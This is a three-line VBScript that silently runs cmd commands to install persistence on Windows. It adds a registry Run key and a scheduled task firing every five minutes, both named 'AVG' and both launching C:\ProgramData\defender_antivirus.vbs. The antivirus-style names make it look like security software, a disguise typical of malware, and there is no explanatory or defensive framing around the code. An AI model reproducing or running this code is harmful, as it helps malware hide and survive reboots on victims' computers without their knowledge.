Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AVG /d C:\ProgramData\defender_antivirus.vbs", 0, True
objShell.Run "cmd /c schtasks /create /sc minute /mo 5 /tn AVG /tr C:\ProgramData\defender_antivirus.vbs", 0, True